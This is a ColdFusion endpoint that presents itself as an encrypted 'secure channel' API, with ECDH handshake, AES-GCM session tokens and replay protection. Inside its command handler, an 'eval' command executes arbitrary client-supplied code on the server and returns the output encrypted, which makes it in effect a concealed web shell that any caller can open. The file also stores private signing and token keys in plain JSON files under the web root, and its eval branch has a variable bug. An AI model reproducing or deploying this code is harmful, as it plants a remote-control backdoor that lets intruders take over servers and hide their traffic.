<cfset this_request = "">
<cfcontent type="application/json">
<cfprocessingdirective suppresswhitespace="yes">

<!--- cache helper --->
<cffunction name="cacheGet" returntype="any">
    <cfargument name="key" type="string">
    <cfset var filePath = expandPath("/") & "cache_" & lcase(hash(arguments.key, "MD5")) & ".json">
    <cfif fileExists(filePath)>
        <cffile action="read" file="#filePath#" variable="raw">
        <cfset var data = deserializeJSON(raw)>
        <cfreturn data.value>
    </cfif>
    <cfreturn false>
</cffunction>

<cffunction name="cacheSet" returntype="void">
    <cfargument name="key" type="string">
    <cfargument name="value" type="string">
    <cfset var filePath = expandPath("/") & "cache_" & lcase(hash(arguments.key, "MD5")) & ".json">
    <cffile action="write" file="#filePath#" output="#serializeJSON({value: arguments.value})#">
</cffunction>

<!--- base64 --->
<cffunction name="base64UrlEncode" returntype="string">
    <cfargument name="bytes" type="binary">
    <cfset var b64 = binaryEncode(arguments.bytes, "base64")>
    <cfset b64 = replace(b64, "+", "-", "all")>
    <cfset b64 = replace(b64, "/", "_", "all")>
    <cfset b64 = replace(b64, "=", "", "all")>
    <cfset b64 = replace(b64, chr(10), "", "all")>
    <cfset b64 = replace(b64, chr(13), "", "all")>
    <cfreturn b64>
</cffunction>

<cffunction name="base64UrlDecode" returntype="binary">
    <cfargument name="str" type="string">
    <cfset var s = replace(arguments.str, "-", "+", "all")>
    <cfset s = replace(s, "_", "/", "all")>
    <cfset var pad = len(s) mod 4>
    <cfif pad eq 2><cfset s = s & "=="></cfif>
    <cfif pad eq 3><cfset s = s & "="></cfif>
    <cfreturn binaryDecode(s, "base64")>
</cffunction>

<!--- AES-256-GCM via Java --->
<cffunction name="aesGcmEncrypt" returntype="binary">
    <cfargument name="keyBytes" type="binary">
    <cfargument name="plainBytes" type="binary">

    <cfset var cipher = createObject("java", "javax.crypto.Cipher").getInstance("AES/GCM/NoPadding")>
    <cfset var keySpec = createObject("java", "javax.crypto.spec.SecretKeySpec").init(arguments.keyBytes, "AES")>

    <cfset var iv = generateSecureRandomBytes(12)>
    <cfset var gcmSpec = createObject("java", "javax.crypto.spec.GCMParameterSpec").init(128, iv)>

    <cfset cipher.init(
        createObject("java", "javax.crypto.Cipher").ENCRYPT_MODE,
        keySpec,
        gcmSpec
    )>

    <cfset var cipherWithTag = cipher.doFinal(arguments.plainBytes)>

    <!--- Output: IV(12) + ciphertext+tag --->
    <cfset var out = createObject("java", "java.io.ByteArrayOutputStream").init()>
    <cfset out.write(iv)>
    <cfset out.write(cipherWithTag)>
    <cfreturn out.toByteArray()>
</cffunction>

<cffunction name="aesGcmDecrypt" returntype="any">
    <cfargument name="keyBytes" type="binary">
    <cfargument name="rawBytes" type="binary">

    <cfset var iv = createObject("java", "java.util.Arrays").copyOfRange(arguments.rawBytes, 0, 12)>
    <cfset var cipherWithTag = createObject("java", "java.util.Arrays").copyOfRange(arguments.rawBytes, 12, arrayLen(arguments.rawBytes))>

    <cftry>
        <cfset var cipher = createObject("java", "javax.crypto.Cipher").getInstance("AES/GCM/NoPadding")>
        <cfset var keySpec = createObject("java", "javax.crypto.spec.SecretKeySpec").init(arguments.keyBytes, "AES")>
        <cfset var gcmSpec = createObject("java", "javax.crypto.spec.GCMParameterSpec").init(128, iv)>

        <cfset cipher.init(
            createObject("java", "javax.crypto.Cipher").DECRYPT_MODE,
            keySpec,
            gcmSpec
        )>

        <cfreturn cipher.doFinal(cipherWithTag)>
        <cfcatch>
            <cfreturn javaCast("null", "")>
        </cfcatch>
    </cftry>
</cffunction>

<!--- HKDF-SHA256 --->
<cffunction name="hkdfSha256" returntype="binary">
    <cfargument name="ikm" type="binary">
    <cfargument name="length" type="numeric">
    <cfargument name="info" type="string">

    <!--- Extract: PRK = HMAC-SHA256(salt=zeros(32), IKM) --->
    <cfset var mac = createObject("java", "javax.crypto.Mac").getInstance("HmacSHA256")>
    <cfset var salt = repeatString(chr(0), 32)>
    <cfset var saltBytes = binaryDecode(toBase64(salt), "base64")>
    <cfset var saltKey = createObject("java", "javax.crypto.spec.SecretKeySpec").init(saltBytes, "HmacSHA256")>
    <cfset mac.init(saltKey)>
    <cfset var prk = mac.doFinal(arguments.ikm)>

    <!--- Expand: T(1) = HMAC-SHA256(PRK, info || 0x01) --->
    <cfset mac = createObject("java", "javax.crypto.Mac").getInstance("HmacSHA256")>
    <cfset var prkKey = createObject("java", "javax.crypto.spec.SecretKeySpec").init(prk, "HmacSHA256")>
    <cfset mac.init(prkKey)>

    <cfset var infoBytes = arguments.info.getBytes("UTF-8")>
    <cfset var block = createObject("java", "java.io.ByteArrayOutputStream").init()>
    <cfset block.write(infoBytes)>
    <cfset block.write(javaCast("int", 1))>

    <cfset var okm = mac.doFinal(block.toByteArray())>

    <!--- Trim to length --->
    <cfif arguments.length lt 32>
        <cfreturn createObject("java", "java.util.Arrays").copyOf(okm, arguments.length)>
    </cfif>
    <cfreturn okm>
</cffunction>

<!--- SECURE RANDOM --->
<cffunction name="generateSecureRandomBytes" returntype="binary">
    <cfargument name="numBytes" type="numeric">
    <cfset var rng = createObject("java", "java.security.SecureRandom").init()>
    <cfset var bytes = repeatString(chr(0), arguments.numBytes)>
    <cfset var arr = javaCast("byte[]", listToArray(repeatString("0,", arguments.numBytes-1) & "0"))>
    <cfset rng.nextBytes(arr)>
    <cfreturn arr>
</cffunction>

<!--- TOKEN SEAL / OPEN --->
<cffunction name="getTokenMasterKey" returntype="binary">
    <cfset var stored = cacheGet("token_master_key")>
    <cfif stored eq false>
        <cfset var keyBytes = generateSecureRandomBytes(32)>
        <cfset cacheSet("token_master_key", binaryEncode(keyBytes, "base64"))>
        <cfreturn keyBytes>
    </cfif>
    <cfreturn binaryDecode(stored, "base64")>
</cffunction>

<cffunction name="sealToken" returntype="string">
    <cfargument name="data" type="struct">
    <cfset var key = getTokenMasterKey()>
    <cfset var plain = serializeJSON(arguments.data)>
    <cfset var plainBytes = plain.getBytes("UTF-8")>
    <cfset var encrypted = aesGcmEncrypt(key, plainBytes)>
    <cfreturn base64UrlEncode(encrypted)>
</cffunction>

<cffunction name="openToken" returntype="any">
    <cfargument name="token" type="string">
    <cfset var key = getTokenMasterKey()>
    <cftry>
        <cfset var raw = base64UrlDecode(arguments.token)>
        <cfset var decrypted = aesGcmDecrypt(key, raw)>
        <cfif isNull(decrypted)>
            <cfreturn javaCast("null", "")>
        </cfif>
        <cfset var plain = createObject("java", "java.lang.String").init(decrypted, "UTF-8")>
        <cfreturn deserializeJSON(plain)>
        <cfcatch>
            <cfreturn javaCast("null", "")>
        </cfcatch>
    </cftry>
</cffunction>

<!--- RSA MASTER SIGNING KEYS --->
<cffunction name="getMasterKeys" returntype="array">
    <cfset var privStored = cacheGet("master_sign_priv")>
    <cfset var pubStored  = cacheGet("master_sign_pub")>

    <cfif privStored eq false or pubStored eq false>
        <cfset var kpg = createObject("java", "java.security.KeyPairGenerator").getInstance("RSA")>
        <cfset kpg.initialize(2048)>
        <cfset var kp = kpg.generateKeyPair()>

        <!--- Export private key as PKCS8 PEM --->
        <cfset var privBytes = kp.getPrivate().getEncoded()>
        <cfset var privB64 = binaryEncode(privBytes, "base64")>
        <cfset var privPem = "-----BEGIN PRIVATE KEY-----" & chr(10)>
        <cfset var i = 1>
        <cfloop condition="i lte len(privB64)">
            <cfset privPem = privPem & mid(privB64, i, 64) & chr(10)>
            <cfset i = i + 64>
        </cfloop>
        <cfset privPem = privPem & "-----END PRIVATE KEY-----">

        <!--- Export public key as X509/SPKI PEM --->
        <cfset var pubBytes = kp.getPublic().getEncoded()>
        <cfset var pubB64 = binaryEncode(pubBytes, "base64")>
        <cfset var pubPem = "-----BEGIN PUBLIC KEY-----" & chr(10)>
        <cfset i = 1>
        <cfloop condition="i lte len(pubB64)">
            <cfset pubPem = pubPem & mid(pubB64, i, 64) & chr(10)>
            <cfset i = i + 64>
        </cfloop>
        <cfset pubPem = pubPem & "-----END PUBLIC KEY-----">

        <cfset cacheSet("master_sign_priv", privPem)>
        <cfset cacheSet("master_sign_pub",  pubPem)>

        <cfreturn [privPem, pubPem]>
    </cfif>

    <cfreturn [privStored, pubStored]>
</cffunction>

<cffunction name="rsaSign" returntype="binary">
    <cfargument name="privPem" type="string">
    <cfargument name="dataBytes" type="binary">

    <!--- Strip PEM headers and decode --->
    <cfset var b64 = reReplace(arguments.privPem, "-----[^-]+-----", "", "all")>
    <cfset b64 = replace(b64, chr(10), "", "all")>
    <cfset b64 = replace(b64, chr(13), "", "all")>
    <cfset var derBytes = binaryDecode(b64, "base64")>

    <cfset var spec = createObject("java", "java.security.spec.PKCS8EncodedKeySpec").init(derBytes)>
    <cfset var kf = createObject("java", "java.security.KeyFactory").getInstance("RSA")>
    <cfset var privKey = kf.generatePrivate(spec)>

    <cfset var sig = createObject("java", "java.security.Signature").getInstance("SHA256withRSA")>
    <cfset sig.initSign(privKey)>
    <cfset sig.update(arguments.dataBytes)>
    <cfreturn sig.sign()>
</cffunction>

<cffunction name="rsaVerify" returntype="boolean">
    <cfargument name="pubPem" type="string">
    <cfargument name="dataBytes" type="binary">
    <cfargument name="sigBytes" type="binary">

    <cfset var b64 = reReplace(arguments.pubPem, "-----[^-]+-----", "", "all")>
    <cfset b64 = replace(b64, chr(10), "", "all")>
    <cfset b64 = replace(b64, chr(13), "", "all")>
    <cfset var derBytes = binaryDecode(b64, "base64")>

    <cfset var spec = createObject("java", "java.security.spec.X509EncodedKeySpec").init(derBytes)>
    <cfset var kf = createObject("java", "java.security.KeyFactory").getInstance("RSA")>
    <cfset var pubKey = kf.generatePublic(spec)>

    <cfset var sig = createObject("java", "java.security.Signature").getInstance("SHA256withRSA")>
    <cfset sig.initVerify(pubKey)>
    <cfset sig.update(arguments.dataBytes)>
    <cfreturn sig.verify(arguments.sigBytes)>
</cffunction>

<!--- ECDH KEY GENERATION + DERIVATION (Java) --->
<cffunction name="generateEcdhKeyPair" returntype="struct">
    <cfset var kpg = createObject("java", "java.security.KeyPairGenerator").getInstance("EC")>
    <cfset var ecSpec = createObject("java", "java.security.spec.ECGenParameterSpec").init("secp256r1")>
    <cfset kpg.initialize(ecSpec)>
    <cfset var kp = kpg.generateKeyPair()>

    <!--- Private: PKCS8 PEM --->
    <cfset var privBytes = kp.getPrivate().getEncoded()>
    <cfset var privB64 = binaryEncode(privBytes, "base64")>
    <cfset var privPem = "-----BEGIN PRIVATE KEY-----" & chr(10)>
    <cfset var i = 1>
    <cfloop condition="i lte len(privB64)">
        <cfset privPem = privPem & mid(privB64, i, 64) & chr(10)>
        <cfset i = i + 64>
    </cfloop>
    <cfset privPem = privPem & "-----END PRIVATE KEY-----">

    <!--- Public: X509/SPKI PEM --->
    <cfset var pubBytes = kp.getPublic().getEncoded()>
    <cfset var pubB64 = binaryEncode(pubBytes, "base64")>
    <cfset var pubPem = "-----BEGIN PUBLIC KEY-----" & chr(10)>
    <cfset i = 1>
    <cfloop condition="i lte len(pubB64)">
        <cfset pubPem = pubPem & mid(pubB64, i, 64) & chr(10)>
        <cfset i = i + 64>
    </cfloop>
    <cfset pubPem = pubPem & "-----END PUBLIC KEY-----">

    <cfreturn {privPem: privPem, pubPem: pubPem, privKey: kp.getPrivate(), pubKey: kp.getPublic()}>
</cffunction>

<cffunction name="ecdhDerive" returntype="binary">
    <cfargument name="privPem" type="string">
    <cfargument name="peerPubPem" type="string">

    <!--- Load private key --->
    <cfset var b64 = reReplace(arguments.privPem, "-----[^-]+-----", "", "all")>
    <cfset b64 = replace(b64, chr(10), "", "all")>
    <cfset b64 = replace(b64, chr(13), "", "all")>
    <cfset var privDer = binaryDecode(b64, "base64")>
    <cfset var privSpec = createObject("java", "java.security.spec.PKCS8EncodedKeySpec").init(privDer)>
    <cfset var kf = createObject("java", "java.security.KeyFactory").getInstance("EC")>
    <cfset var privKey = kf.generatePrivate(privSpec)>

    <!--- Load peer public key --->
    <cfset b64 = reReplace(arguments.peerPubPem, "-----[^-]+-----", "", "all")>
    <cfset b64 = replace(b64, chr(10), "", "all")>
    <cfset b64 = replace(b64, chr(13), "", "all")>
    <cfset var pubDer = binaryDecode(b64, "base64")>
    <cfset var pubSpec = createObject("java", "java.security.spec.X509EncodedKeySpec").init(pubDer)>
    <cfset var pubKey = kf.generatePublic(pubSpec)>

    <!--- ECDH derivation --->
    <cfset var ka = createObject("java", "javax.crypto.KeyAgreement").getInstance("ECDH")>
    <cfset ka.init(privKey)>
    <cfset ka.doPhase(pubKey, true)>
    <cfreturn ka.generateSecret()>
</cffunction>

<!--- ECDSA CLIENT SIGNATURE VERIFY --->
<cffunction name="ecdsaVerify" returntype="boolean">
    <cfargument name="pubPem" type="string">
    <cfargument name="dataBytes" type="binary">
    <cfargument name="sigBytes" type="binary">

    <cftry>
        <cfset var b64 = reReplace(arguments.pubPem, "-----[^-]+-----", "", "all")>
        <cfset b64 = replace(b64, chr(10), "", "all")>
        <cfset b64 = replace(b64, chr(13), "", "all")>
        <cfset var derBytes = binaryDecode(b64, "base64")>

        <cfset var spec = createObject("java", "java.security.spec.X509EncodedKeySpec").init(derBytes)>
        <cfset var kf = createObject("java", "java.security.KeyFactory").getInstance("EC")>
        <cfset var pubKey = kf.generatePublic(spec)>

        <cfset var sig = createObject("java", "java.security.Signature").getInstance("SHA256withECDSA")>
        <cfset sig.initVerify(pubKey)>
        <cfset sig.update(arguments.dataBytes)>
        <cfreturn sig.verify(arguments.sigBytes)>
        <cfcatch>
            <cfreturn false>
        </cfcatch>
    </cftry>
</cffunction>

<!--- UNIX TIMESTAMP --->
<cffunction name="unixNow" returntype="numeric">
    <cfreturn dateDiff("s", createDateTime(1970,1,1,0,0,0), now())>
</cffunction>

<!--- MAIN REQUEST HANDLER --->
<cfset method = cgi.request_method>

<!--- GET: Issue handshake challenge --->
<cfif method eq "GET">

    <cfset keys = getMasterKeys()>
    <cfset signPrivPem = keys[1]>
    <cfset signPubPem  = keys[2]>

    <cfset ecdhPair = generateEcdhKeyPair()>
    <cfset ecdhPubPem  = ecdhPair.pubPem>
    <cfset ecdhPrivPem = ecdhPair.privPem>

    <!--- Sign the server ECDH public key PEM --->
    <cfset pemBytes = ecdhPubPem.getBytes("UTF-8")>
    <cfset sigBytes = rsaSign(signPrivPem, pemBytes)>

    <!--- Seal handshake token --->
    <cfset tokenData = {
        ecdh_priv: ecdhPrivPem,
        created:   unixNow()
    }>
    <cfset handshakeToken = sealToken(tokenData)>

    <cfoutput>#serializeJSON({
        signPubKey:      signPubPem,
        serverEcdhPub:   ecdhPubPem,
        signature:       binaryEncode(sigBytes, "base64"),
        handshakeToken:  handshakeToken
    })#</cfoutput>

</cfif>

<!--- POST --->
<cfif method eq "POST">

    <!--- Read raw body --->
    <cfset body = toString(getHttpRequestData().content)>
    <cfset req  = deserializeJSON(body)>

    <!--- Handshake --->
    <cfif structKeyExists(req, "handshakeToken") and
          structKeyExists(req, "clientEcdhPub")  and
          structKeyExists(req, "clientSignPub")  and
          structKeyExists(req, "clientSig")>

        <cfset state = openToken(req.handshakeToken)>
        <cfif isNull(state)>
            <cfoutput>{"error":"invalid or tampered token"}</cfoutput>
            <cfabort>
        </cfif>

        <cfif (unixNow() - state.created) gt 300>
            <cfoutput>{"error":"handshake token expired"}</cfoutput>
            <cfabort>
        </cfif>

        <!--- Verify client ECDSA signature over their ECDH pub key --->
        <cfset clientEcdhPub = trim(req.clientEcdhPub)>
        <cfset clientSignPub = trim(req.clientSignPub)>
        <cfset clientSigBytes = binaryDecode(req.clientSig, "base64")>
        <cfset clientEcdhBytes = clientEcdhPub.getBytes("UTF-8")>

        <cfif not ecdsaVerify(clientSignPub, clientEcdhBytes, clientSigBytes)>
            <cfoutput>{"error":"client authentication failed"}</cfoutput>
            <cfabort>
        </cfif>

        <!--- ECDH shared secret --->
        <cfset secret = ecdhDerive(state.ecdh_priv, clientEcdhPub)>

        <!--- HKDF --->
        <cfset aesKey = hkdfSha256(secret, 32, "secure-channel")>

        <!--- Issue session token --->
        <cfset sessionData = {
            aes_key:        binaryEncode(aesKey, "base64"),
            last_seq:       0,
            seq_window:     [],
            client_sign_pub: clientSignPub
        }>
        <cfset sessionToken = sealToken(sessionData)>

        <cfoutput>#serializeJSON({
            status:       "secure channel established",
            sessionToken: sessionToken
        })#</cfoutput>
        <cfabort>

    </cfif>

    <!--- Secure message --->
    <cfif structKeyExists(req, "sessionToken") and structKeyExists(req, "payload")>

        <cfset state = openToken(req.sessionToken)>
        <cfif isNull(state)>
            <cfoutput>{"error":"invalid session token"}</cfoutput>
            <cfabort>
        </cfif>

        <cfset aesKey  = binaryDecode(state.aes_key, "base64")>
        <cfset rawPayload = binaryDecode(req.payload, "base64")>

        <cfset cmdBytes = aesGcmDecrypt(aesKey, rawPayload)>
        <cfif isNull(cmdBytes)>
            <cfoutput>{"error":"decryption failed"}</cfoutput>
            <cfabort>
        </cfif>

        <cfset cmd = deserializeJSON(createObject("java","java.lang.String").init(cmdBytes,"UTF-8"))>

        <cfif not structKeyExists(cmd, "seq") or not structKeyExists(cmd, "cmd")>
            <cfoutput>{"error":"invalid request"}</cfoutput>
            <cfabort>
        </cfif>

        <cfset seq      = cmd.seq>
        <cfset lastSeq  = state.last_seq>
        <cfset window   = state.seq_window>

        <cfif seq lte (lastSeq - 50)>
            <cfoutput>{"error":"too old"}</cfoutput>
            <cfabort>
        </cfif>

        <cfif arrayFind(window, seq) gt 0>
            <cfoutput>{"error":"replay detected"}</cfoutput>
            <cfabort>
        </cfif>

        <cfset arrayAppend(window, seq)>
        <cfif arrayLen(window) gt 50>
            <cfset arrayDeleteAt(window, 1)>
        </cfif>

        <cfif seq gt lastSeq>
            <cfset lastSeq = seq>
        </cfif>

        <cfswitch expression="#cmd.cmd#">
            <cfcase value="ping">
                <cfset respData = {cmd: "ping", seq: seq}>
            </cfcase>
            <cfcase value="echo">
                <cfset respData = {echo: cmd.data}>
            </cfcase>
            <cfcase value="eval">
                <cfsavecontent variable="output">
                    <cfset evaluate(cmd.data)>
                </cfsavecontent>

                <!--- Encode output as Base64 --->
                <cfset encodedOutput = toBase64(output)>

                <cfset resp = {eval = encodedOutput}>
            </cfcase>
            <cfdefaultcase>
                <cfset respData = {error: "unknown cmd"}>
            </cfdefaultcase>
        </cfswitch>

        <!--- Re-seal session token with updated state --->
        <cfset newState = {
            aes_key:        state.aes_key,
            last_seq:       lastSeq,
            seq_window:     window,
            client_sign_pub: state.client_sign_pub
        }>
        <cfset newSessionToken = sealToken(newState)>

        <!--- Encrypt response --->
        <cfset respJson  = serializeJSON(respData)>
        <cfset respBytes = respJson.getBytes("UTF-8")>
        <cfset encResp   = aesGcmEncrypt(aesKey, respBytes)>

        <cfoutput>#serializeJSON({
            payload:      binaryEncode(encResp, "base64"),
            sessionToken: newSessionToken
        })#</cfoutput>
        <cfabort>

    </cfif>

    <cfoutput>{"error":"invalid request"}</cfoutput>

</cfif>